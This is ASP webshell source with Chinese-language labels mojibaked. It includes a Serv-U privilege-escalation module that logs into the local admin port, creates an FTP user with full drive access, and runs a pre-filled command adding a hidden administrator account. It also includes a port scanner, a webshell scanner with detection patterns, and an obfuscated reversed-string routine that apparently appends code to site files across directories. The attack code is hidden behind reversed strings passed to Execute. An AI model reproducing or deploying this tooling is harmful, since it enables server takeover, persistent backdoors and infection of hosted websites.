		If Err.number = -2147217843 or Err.number = -2147467259 Then
			If InStr(Err.description, "(Connect()).") > 0 Then
				RRS(targetip & ":" & portNum & ".........�ر�<br>")
			Else
				RRS(targetip & ":" & portNum & ".........<font color=red>����</font><br>")
			End If
		End If
	End If
End Sub
Select Case Action
  Case "MainMenu":MainMenu()
  Case "getTerminalInfo":getTerminalInfo()
  Case "PageAddToMdb":PageAddToMdb()
  case "ScanPort":ScanPort()
  Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
   f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
ShiSan="����>tpircs/<��SRR���;)0004,';)(timbus.nusdlog.lla.tnemucod'(tuoemiTtes��SRR���;)'>retnec<...��&ssap&�壺���,��&resu&�� :��������ʹ,��&trop&��:1.0.0.721 ��������>retnec<'(etirw.tnemucod��SRR���>'tpircsavaj'=egaugnal tpircs<��SRR���>mrof/<>'2'=eulav 'noitcaUS'=di 'neddih'=epyt 'noitcaUS'=eman tupni<��SRR���>'05'=ezis '��&f&��'=eulav 'f'=di 'neddih'=epyt 'f'=eman tupni<��SRR���>'05'=ezis '��&dmc&��'=eulav 'c'=di 'neddih'=epyt 'c'=eman tupni<��SRR���>dt/<>'��&trop&��'=eulav 'trop'=di 'neddih'=epyt 'trop'=eman tupni<��SRR���>dt/<>'��&ssap&��'=eulav 'p'=di 'neddih'=epyt 'p'=eman tupni<��SRR���>dt/<>'��&resu&��'=eulav 'u'=di 'neddih'=epyt 'u'=eman tupni<��SRR���>'nusdlog'=eman 'tsop'=dohtem mrof<��SRR��a=)��a��(noisses tes��tiuq & resuwen & niamodwen & niamodled & tm & ssapnigol & resunigol dnes.a���� ,��� ,eurT,��1s/nimdapu/nusdlog/�� & trop & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.a��)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=a tes"
ExeCuTe(ShiSanFun(ShiSan))
case 2
ShiSan="����>tpircs/<��SRR���;)0004,���;)(timbus.nusdlog.lla.tnemucod���(tuoemiTtes��SRR���;)'>retnec<,...������,��Ȩ��������>retnec<'(etirw.tnemucod��SRR���>'tpircsavaj'=egaugnal tpircs<��SRR���>mrof/<>'3'=eulav 'noitcaUS'=di 'neddih'=epyt 'noitcaUS'=eman tupni<��SRR���>'05'=ezis '��&f&��'=eulav 'f'=di 'neddih'=epyt 'f'=eman tupni<��SRR���>'05'=ezis '��&dmc&��'=eulav 'c'=di 'neddih'=epyt 'c'=eman tupni<��SRR���>dt/<>'��&trop&��'=eulav 'trop'=di 'neddih'=epyt 'trop'=eman tupni<��SRR���>dt/<>'��&ssap&��'=eulav 'p'=di 'neddih'=epyt 'p'=eman tupni<��SRR���>dt/<>'��&resu&��'=eulav 'u'=di 'neddih'=epyt 'u'=eman tupni<��SRR���>'nusdlog'=eman 'tsop'=dohtem mrof<��SRR��b=)��b��(noisses tes ��tiuq & fLrCbv & dmc & �� cexe etis�� & fLrCbv & ��do ssap�� & fLrCbv & ��og resU�� dnes.b���� ,��� ,eurT ,��2s/nimdapu/nusdlog/�� & tropptf & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.b��)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=b tes"
ExeCuTe(ShiSanFun(ShiSan))

case 3
ShiSan="����>retnec/<��SRR���>���;'uvreS=noitcA?'=ferh.noitacol���=kcilCno ' ���̻ط� '=eulav nottub=epyt tupni<��SRR���>rb<>rb<>tnof/<��&dmc&��>der=roloc tnof<>rb<����������ִ��,����Ȩ��>retnec<��SRR��c=)��c��(noisses tes��tiuq & niamodled & tm & ssapnigol & resunigol dnes.c���� ,��� ,eurT ,��3s/nimdapu/nusdlog/�� & trop & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.c��)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=c tes"
ExeCuTe(ShiSanFun(ShiSan))
case else
on error resume next
    set a=session("a")
    set b=session("b")
    set c=session("c")
    a.abort
    Set a = Nothing
    b.abort
    Set b = Nothing
    c.abort
    Set c = Nothing
RRS"<center><form method='post' name='goldsun'>"
RRS"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'>Serv-U ����Ȩ�� ASP�� 6.2</td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td width='100'>�û���:</td>"
RRS"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>�� �</td>"
RRS"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>�� �ڣ�</td>"
RRS"<td><input name='port' type='text' id='port' value='43958'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>ϵͳ·����</td>"
RRS"    <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
RRS"  </tr>"
RRS"  <tr align='center' valign='middle'>"
RRS"    <td>�����</td>"
RRS"    <td><input name='c' type='text' id='c' value='cmd /c net user huohu$ huohu /add & net localgroup administrators huohu$ /add' size='50'></td>"
RRS"  </tr>"
RRS" <tr align='center' valign='middle'>"
RRS"    <td colspan='2'><input type='submit' name='Submit' value='�ύ'> "
RRS"<input type='reset' name='Submit2' value='����'>"
RRS"<input name='SUaction' type='hidden' id='action' value='1'></td>"
RRS"</tr></table></form></center>"
end select


function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function
  Case "kmuma"
	dim Report
	if request.QueryString("act")<>"scan" then
	  	RRS ("<b>��վ��Ŀ¼</b>- "&Server.MapPath("/")&"<br>")
		RRS ("<b>������Ŀ¼</b>- "&Server.MapPath("."))

		RRS "<form action=""?Action=kmuma&act=scan"" method=""post"" name=""form1"">"
		RRS "<p><b>������Ҫ����·����</b>"
		RRS "<input name=""path"" type=""text"" style=""border:1px solid #999"" value=""."" size=""30"" /> �\����վ��Ŀ¼����.��Ϊ������Ŀ¼<br><br>"
		RRS "��Ҫ��ʲô: <input class=c name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>��ASP "
		RRS "<input class=c type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">������������֮�ļ�<br>"
		RRS "<br /><div id=""showFile1"" style=""display:none"">"
		RRS "&nbsp;&nbsp;�������ݣ�<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">"
		RRS " Ҫ���ҵ��ַ����������ֻ�������ڼ��<br />"
		RRS "&nbsp;&nbsp;�޸����ڣ�<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&Left(Now(),InStr(now()," ")-1)&""" size=""20""> ���������;����������������д <a href=""#"" onClick=""javascript:form1.Search_Date.value='ALL'"">ALL</a><br />"
		RRS "&nbsp;&nbsp;�ļ����ͣ�<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20""> ����֮����,������*��ʾ��������<br /><br /></div>"
		RRS "<input type=""submit"" value="" ��ʼɨ�� "" style=""background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;"" />"
		RRS "</form>"
	else
		if request.Form("path")="" then
			RRS("·������Ϊ��")
			response.End()
		end if
		if request.Form("path")="\" then
			TmpPath = Server.MapPath("\")
		elseif request.Form("path")="." then
			TmpPath = Server.MapPath(".")
		else
			TmpPath = request.Form("path")
		end if
		
		timer1 = timer
		Sun = 0
		SumFiles = 0
		SumFolders = 1
		If request.Form("radiobutton") = "sws" Then
			DimFileExt = "asp,cer,asa,cdx"
			Call ShowAllFile(TmpPath)
		Else
			If request.Form("path") = "" or request.Form("Search_Date") = "" or request.Form("Search_FileExt") = "" Then
				RRS("������������ȫ<br><br><a href='javascript:history.go(-1);'>�뷵����������</a>")
				response.End()
			End If
			DimFileExt = request.Form("Search_fileExt")
			Call ShowAllFile2(TmpPath)
		End If
RRS "<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style='font-size:12px'>"
RRS "<tr><th>Scan WebShell -- ʮ���Ż���</tr>"
RRS "<tr><td style=""padding:5px;line-height:170%;clear:both;font-size:12px"">"
RRS "<div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>"
RRS "ɨ����ϣ�һ������ļ���<font color=""#FF0000"">"&SumFolders&"</font>�����ļ�<font color=""#FF0000"">"&SumFiles&"</font>�������ֿ��ɵ�<font color=""#FF0000"">"&Sun&"</font>��"
RRS "<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
If request.Form("radiobutton") = "sws" Then
	RRS "<td width=""20%"">�ļ����·��</td>"
	RRS "<td width=""20%"">������</td>"
	RRS "<td width=""40%"">����</td>"
	RRS "<td width=""20%"">����/�޸�ʱ��</td>"
else   
	RRS "<td width=""50%"">�ļ����·��</td>"
	RRS "<td width=""25%"">�ļ�����ʱ��</td>"
	RRS "<td width=""25%"">�޸�ʱ��</td>"
end if
	RRS "</tr>"
	RRS Report
	RRS "<br/></table>"
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
RRS "<br><font style='font-size:12px'>��ҳִ�й�����"&thetime&"����</font>"
	end if
Sub ShowAllFile(Path)
	Set F1SO = CreateObject("Scripting.FileSystemObject")
	if not F1SO.FolderExists(path) then exit sub
	Set f = F1SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call ScanFile(Path&Temp&"\"&myfile.name, "")
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F1SO = Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
	If InFile <> "" Then
		Infiles = "<font color=red>���ļ���<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>�ļ�����ִ��</font>"
	End If
	Set FSO1s = CreateObject("Scripting.FileSystemObject")
	on error resume next
	set ofile = FSO1s.OpenTextFile(FilePath)
	filetxt = Lcase(ofile.readall())
	If err Then Exit Sub end if
	if len(filetxt)>0 then
		filetxt = vbcrlf & filetxt
		temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a><br />"
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"	
			If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell ���� clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>Σ�������һ�㱻ASPľ����</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End if
			If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application ���� clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>Σ�������һ�㱻ASPľ����</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			Set regEx = New RegExp
			regEx.IgnoreCase = True
			regEx.Global = True
			regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>�ƺ��ű���������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\bEv"&"al\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()��������ִ������ASP����<br>����javascript������Ҳ����ʹ�ã��п������󱨡�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "[^.]\bExe"&"cute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()��������ִ������ASP����</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.(Open|Create)TextFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>ʹ����FSO��CreateTextFile|OpenTextFile��д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.SaveToFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>ʹ����Stream��SaveToFile����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.Save\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Save</td><td>ʹ����XMLHTTP��Save����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
		If regEx.Test(filetxt) Then
			Report = Report&"<tr><td>"&temp&"</td><td>Server.Exec"&"ute</td><td><font color=red>���ܸ��ټ��Server.e"&"xecute()����ִ�е��ļ���</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
			Sun = Sun + 1
		End If
		Set Matches = Nothing
		Set regEx = Nothing
		Set XregEx = New RegExp
		XregEx.IgnoreCase = True
		XregEx.Global = True
		XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
		Set XMatches = XregEx.Execute(filetxt)
		For Each Match in XMatches
			tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
			srcSeek = InStr(1, tmpLake2, "src", 1)
			If srcSeek > 0 Then
				srcSeek2 = instr(srcSeek, tmpLake2, "=")
				For i = 1 To 50
					tmp = Mid(tmpLake2, srcSeek2 + i, 1)
					If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
						Exit For
					End If
				Next
				If tmp = """" Then
					tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
				Else
					If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
					If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
					If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
					If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
				End If
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
				Report = Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject����ʹ���˱��μ���"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				exit sub
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
	end if
	set ofile = nothing
	set FSO1s = nothing
End Sub
Function CheckExt(FileExt)
	If DimFileExt = "*" Then CheckExt = True
	Ext = Split(DimFileExt,",")
	For i = 0 To Ubound(Ext)
		If Lcase(FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
End Function
Function GetDateModify(filepath)
	Set F2SO = CreateObject("Scripting.FileSystemObject")
    Set f = F2SO.GetFile(filepath) 
	s = f.DateLastModified 
	set f = nothing
	set F2SO = nothing
	GetDateModify = s
End Function
Function GetDateCreate(filepath)
	Set F3SO = CreateObject("Scripting.FileSystemObject")
    Set f = F3SO.GetFile(filepath) 
	s = f.DateCreated 
	set f = nothing
	set F3SO = nothing
	GetDateCreate = s
End Function
Function tURLEncode(Str)
	temp = Replace(Str, "%", "%25")
	temp = Replace(temp, "#", "%23")
	temp = Replace(temp, "&", "%26")
	tURLEncode = temp
End Function
Sub ShowAllFile2(Path)
	Set F4SO = CreateObject("Scripting.FileSystemObject")
	if not F4SO.FolderExists(path) then exit sub
	Set f = F4SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call IsFind(Path&"\"&myfile.name)
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile2 path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F4SO = Nothing
End Sub
Sub IsFind(thePath)
	theDate = GetDateModify(thePath)
	on error resume next
	theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
	if err then exit Sub
	xDate = Split(request.Form("Search_Date"),";")
	If request.Form("Search_Date") = "ALL" Then ALLTime = True
	For i = 0 To Ubound(xDate)
		If theTmp = xDate(i) or ALLTime = True Then 
			If request("Search_Content") <> "" Then
				Set FSO2s = CreateObject("Scripting.FileSystemObject")
				set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
				filetxt = Lcase(ofile.readall())
				If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
					temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
    temp=temp&" �� <a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Report = Report&"<tr><td>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Sun = Sun + 1
					Exit Sub
				End If
				ofile.close()
				Set ofile = Nothing
				Set FSO2s = Nothing
			Else
				temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a> "
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
				Sun = Sun + 1
				Exit Sub
			End If
		End If
	Next
End Sub
  Case "plgm"
Server.ScriptTimeout=1000000 
Response.Buffer=False 
ShiSan="��raelC.rrE�� buS dnE�� gnihtoN=sf teS�� fI dnE�� gnihtoN=f teS�� esolC.edocdda_f�� edocdda etirW.edocdda_f�� )2-,8(maertStxeTsAnepO.f=edocdda_f teS�� )2rts(eliFteG.sf=f teS�� nehT tsixEsi fI�� )2rts(stsixEeliF.sf=tsixEsi�� )��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerc.revreS=sf teS�� )2rts(2pets buS�� buS dnE���>vid/<>a/<evoM>'����'=eltit 'ma'=ssalc ')���eliFevoM���,����&)��\\��,��\��,1rts(ecalper&����(mroFlluF:tpircsavaj'=ferh a<�� SRR��� >a/<ypoC>'�Ƹ�'=eltit 'ma'=ssalc ')���eliFypoC���,����&)��\\��,��\��,1rts(ecalper&����(mroFlluF:tpircsavaj'=ferh a<�� SRR��� >a/<leD>'��ɾ'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno')���eliFleD���,����&)��\\��,��\��,1rts(ecalper&����(mroFlluF:tpircsavaj'=ferh a<�� SRR��� >a/<tide>'����'=eltit 'ma'=ssalc ')���eliFtidE���,����&)��\\��,��\��,1rts(ecalper&����(mroFlluF:tpircsavaj'=ferh a<�� SRR��� >a/<nwoD>'����'=eltit 'ma'=ssalc ')���eliFnwoD���,����&)��\\��,��\��,1rts(ecalper&����(mroFlluF:tpircsavaj'=ferh a<�� sRR���_ ��&1rts&�� ��>'xp02:thgieh-enil'=elyts vid<�� SRR��)1rts(1pets buS�� buS dnE�� fI dnE�� buS tixE�� eslE�� rga 2pets�� rga 1pets�� nehT laVter fI�� )rga,��b\)sj|igc|xpsa|psj|php|psa|lmth|mth(.\)505|piv|ciptfos_elifpu|otohp_elifpu|tfos_elifpu|daol_elifpu|daolpu_nimda|elifpu_nimda|txet|hsalf|da|cn|rre|pohs|tsil|ofni|rahc|toof|dnes|404rre|pi|weiv|wohs|yalp|puym|puwen|025|QQ|ogol|metsys|nwod|evom|ypoc|rorre|dov|3pm|gifnoc|tb|koob|reganam|tuoba|emag|tide|dda|atad|evas|golb|bew|segami|gmi|liame|eman|nepo|wen|pot|psa|ptf|bbu|resu|lqs|gifnoc|led|ko|on|yid|nigol|ssalc|trac|daolpu|elifpu|pleh|ger|sbb|nimda|nnoc|xedni|tluafed()/\|\\(��(nrettaPsI=laVter�� )rga(lla_pets buS�� buS dnE�� fI dnE�� txeN�� l hcs�� fs nI l hcaE roF�� nehT 0><tnuoC.fs fI�� txeN�� ntr lla_pets�� htap.f=ntr�� if ni f hcaE roF�� sredloFbuS.df=fs teS�� seliF.df=if teS�� )s(redloFteG.sf=df teS�� )��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerc.revreS=sf teS�� TxEn EmUsEr rOrRe No�� )s(hcs buS�� fi dne��fI dnE�� s hcs nehT )s,��)/\|\\(}1{:}1{]ba^[��(nrettaPsI fI esle��dne.esnopser���>tnof/<!�����·�Ĺ�������>der=roloc 